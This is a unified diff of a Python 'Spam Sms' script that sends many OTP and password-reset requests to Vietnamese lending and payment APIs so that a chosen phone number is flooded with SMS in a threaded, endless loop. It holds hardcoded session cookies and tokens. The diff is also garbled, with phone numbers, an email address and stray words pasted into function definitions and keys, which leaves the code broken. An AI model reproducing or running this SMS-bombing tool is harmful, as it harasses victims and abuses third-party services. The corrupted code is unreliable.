@@ -3,10 +3,10 @@
 import sys, os, requests, time
 from concurrent.futures import ThreadPoolExecutor
 
-def clear():097 8135359
+def clear():0978135359
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def custom_delay(delay):097 8135359
+def custom_delay(delay):0978135359
     for remaining in range(delay, 0, -1):
         mins, secs = divmod(remaining, 60)
         for phase in ['....X', '...XX', '..XXX', '.XXXX', 'XXXXX']:
@@ -14,26 +14,26 @@ def custom_delay(delay):097 8135359
             time.sleep(0.1)
     print('              Spam Sms By TuNguyen2712                ', end="\r")
 
-def call1(phone):097 8135359
+def call1(phone):0978135359
     requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text
 
-def call2(phone):097 8135359
+def call2(phone):0978135359
     requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
 
-def call3(phone):097 8135359
+def call3(phone):0978135359
     requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
 
-def call4(phone):097 8135359
+def call4(phone):0978135359
     Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
     Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
     response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
     
-def call5(phone):097 8135359
+def call5(phone):0978135359
     Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
     Datason = json.dumps({"phone": f"84{phone[1:11]}"})
     response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
 
-def call6(phone):097 8135359
+def call6(phone):0978135359
     imei = generateImei()
     sec = getSECUREID()
     token = getTOKEN()
@@ -53,7 +53,7 @@ def call6(phone):097 8135359
         "deviceos: ANDROID"
     ]
     data = {
-        'user': sdt,097 8135359
+        'user': sdt,0978135359
         'msgType': 'CHECKUSERBEMSG',
         'cmdId': str(microtime) + '000000',
         'lang': 'vi',
@@ -69,7 +69,7 @@ def call6(phone):097 8135359
         'errorDesc': '',
         'momoMsg': {
             'class': 'mservice.backend.entity.msg.RegDeviceMsg',
-            'number': sdt,097 8135359
+            'number': sdt,0978135359
             'imei': imei,
             'cname': 'Vietnam',
             'ccode': '084',
@@ -89,17 +89,17 @@ def call6(phone):097 8135359
     }
     GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json.dumps(data), head, False)
 
-def call7(phone):097 8135359
+def call7(phone):0978135359
   cookies = {
-    'supportOnlineTalkID':
+    'supportOnlineTalkID':100013243099243
     'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
-    '__cfruid':
+    '__cfruid':100013243099243
     'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
     'XSRF-TOKEN':
     'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
     'sessionid':
     'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
-    'utm_uid':
+    'utm_uid':100013243099243
     'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
     'ec_cache_utm':
     '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
@@ -119,7 +119,7 @@ def call7(phone):097 8135359
     '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
     'ec_etag_client_utm':
     '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
-    'uid':
+    'uid':100013243099243
     '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
     'client':
     'false',
@@ -144,7 +144,7 @@ def call7(phone):097 8135359
     'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
   }
-  data = {
+  data = {097 8135359
     'phone': phone,
     '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
   }
@@ -153,7 +153,7 @@ def call7(phone):097 8135359
                 headers=headers,
                 data=data)
 
-def call8(phone):097 8135359
+def call8(phone):0978135359
   headers = {
     'authority':
     'api.dongplus.vn',
@@ -183,13 +183,13 @@ def call8(phone):097 8135359
     'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
   }
   json_data = {
-    'phone': phone,
+    'phone': phone,0978135359
   }
   requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                 headers=headers,
                 json=json_data)                                                                
   
-def call9(phone):097 8135359
+def call9(phone):0978135359
   cookies = {
     'OnCredit_id': '643d8607c6ffe8.92935100',
     'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
@@ -210,14 +210,14 @@ def call9(phone):097 8135359
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent':
+    'user-agent':doan-tang-thang
     'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
   }
   data = {
     'data[typeData]':
     'sendCodeReg',
-    'data[phone]':097 8135359
+    'data[phone]':0978135359
     phone,
     'data[email]':doantangtang1997@gmail.com
     'tv5v4v4v4c@gmail.com',
@@ -235,7 +235,7 @@ def call9(phone):097 8135359
                 headers=headers,
                 data=data)
       
-def spam(count, thread_count, phone):097 8135359
+def spam(count, thread_count, phone):0978135359
     ThreadPoolExecutor(max_workers=int(thread_count)).submit(call1, phone)  
     ThreadPoolExecutor(max_workers=int(thread_count)).submit(call2, phone)  
     ThreadPoolExecutor(max_workers=int(thread_count)).submit(call3, phone)  
@@ -251,21 +251,21 @@ def main():
     count = int(1)
     clear()
     while True:
-        phone = input(" 097 8135359").strip()
+        phone = input(" 0978135359").strip()
         if not phone.isnumeric() or len(phone) != 10:
             print("Số Điện Thoại Không Hợp Lệ !!!")
             continue 
-        if phone in ['113', '114', '115', '111', '0379088149']:
+        if phone in ['113', '114', '115', '111', '0978135359']:
             print("Không Thể Spam Số Này !!!")
             continue 
-        thread_count = input("Nhập Luồng: ").strip()
+        thread_count = input("Nhập Luồng: 0978135359").strip()
         if not thread_count.isdigit():
-            print("Vui Lòng Chỉ Nhập Số: ")
+            print("Vui Lòng Chỉ Nhập Số: 0978135359")
             continue  
         break   
     while True:   
         spam(count, thread_count, phone)
         custom_delay(10)
         count += 1
-if __name__ == '__main__':
+if __thang__ == '__main__':
     main()    
